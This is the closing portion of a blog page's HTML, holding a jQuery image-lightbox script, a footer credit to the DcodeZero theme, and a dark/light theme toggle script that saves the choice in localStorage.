  document.getElementById('animated-post-description').style.display = 'initial';
  typeWriter();

  // Image modal
  var $imgs = [];
  $('img').each(function(idx) {
    var obj = {
      src: $(this).attr('src')
    }
    $imgs.push(obj);
    var elem = $(this);
    $(this).click(function() {
      $('.modal').magnificPopup('open', idx);
    });
  });

  $('.modal').magnificPopup({
    items: $imgs,
    type: 'image',
    closeOnContentClick: true,
    mainClass: 'mfp-img-mobile',
    image: {
      verticalFit: true
    }
    
  });
</script>

      </div>
    </main><footer class="site-footer">
  <div class="wrapper">
    <div class="credits"><a href="https://github.com/DcodeZero/dcodezero.github.io">DcodeZero</a> theme for dcodezero by <a href="https://github.com/DcodeZero/dcodezero.github.io">dcodezero</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
    <label for="theme-toggle" class="toggle">
    <span class="toggle__handler">
      <span class="crater crater--1"></span>
      <span class="crater crater--2"></span>
      <span class="crater crater--3"></span>
    </span>
        <span class="star star--1"></span>
        <span class="star star--2"></span>
        <span class="star star--3"></span>
        <span class="star star--4"></span>
        <span class="star star--5"></span>
        <span class="star star--6"></span>
    </label>
</div>
<script type="text/javascript">
const theme = localStorage.getItem('theme');

if (theme === "light") {
    document.documentElement.setAttribute('data-theme', 'light');
} else {
    document.documentElement.setAttribute('data-theme', 'dark');
}
const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');

function activateDarkTheme() {
    document.getElementById('theme-toggle').checked = true;
    document.documentElement.setAttribute('data-theme', 'dark');
    document.documentElement.classList.add('theme--dark');
    document.documentElement.classList.remove('theme--light');
	document.getElementById("theme-toggle").className = 'light';
	window.localStorage.setItem('theme', 'dark');
}

function activateLightTheme() {
    document.getElementById('theme-toggle').checked = false;
    document.documentElement.setAttribute('data-theme', 'light');
    document.documentElement.classList.add('theme--light');
    document.documentElement.classList.remove('theme--dark');
	document.getElementById("theme-toggle").className = 'dark';
	window.localStorage.setItem('theme', 'light');
}

if (theme === "dark") {
    activateDarkTheme();
} else if (theme === "light") {
    activateLightTheme();
} else if  (userPrefers === "light") {
    activateDarkTheme();
} else {
    activateDarkTheme();
}

function modeSwitcher() {
	let currentMode = document.documentElement.getAttribute('data-theme');
	if (currentMode === "dark") {
	    activateLightTheme();
	} else {
	    activateDarkTheme();
	}
}
</script></div>
  </div>
</footer>


<script>
      window.FontAwesomeConfig = {
        searchPseudoElements: true
      }
    </script>
  </body>

</html>
